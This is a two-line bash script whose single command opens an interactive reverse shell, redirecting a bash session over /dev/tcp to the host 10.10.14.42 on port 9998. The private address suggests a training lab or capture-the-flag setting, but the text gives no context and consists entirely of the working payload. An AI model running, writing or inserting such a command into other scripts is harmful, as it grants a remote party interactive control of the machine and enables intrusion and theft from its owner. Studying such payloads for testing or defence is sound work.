#!/bin/bash

/bin/bash -i >& /dev/tcp/10.10.14.42/9998 0>&1
